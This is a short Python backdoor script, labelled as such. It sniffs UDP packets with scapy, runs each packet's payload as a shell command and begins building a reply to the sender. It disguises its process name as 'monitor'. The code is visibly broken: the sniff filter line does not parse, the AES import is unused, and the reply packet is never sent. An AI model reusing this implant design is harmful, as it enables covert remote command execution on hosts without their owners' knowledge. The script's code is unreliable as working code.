import argparse, setproctitle, subprocess
from scapy.all import *
from Crypto.Cipher import AES
from scapy.layers.inet import IP, UDP

parser = argparse.ArgumentParser(description="Backdoor")
parser.add_argument('-d', '--dest', dest='dest', help='Destination IP', required=True)
parser.add_argument('-p', '--port', dest='port', help='Destination Port', required=True)
parser.add_argument('-s', '-source', dest='source_ip', help='Source IP', required=True)
parser.add_argument('-sp', '-source_port', dest='source_port', help='Source Port', required= True)
args = parser.parse_args()


def parse_command(packet):
    payload = packet['Raw'].load
    command = payload.split('#')[0]
    client_ip = payload.split('#')[1]
    proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output = proc.stdout.read()
    print (output)
    pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(dport=packet['UDP'])


def main():
    setproctitle.setproctitle("monitor")
    sniff(filter="udp and dst port " + int(args.port) + and " src port " + int(args.source_port), prn=parse_command)

if __name__ == '__main__':
    main()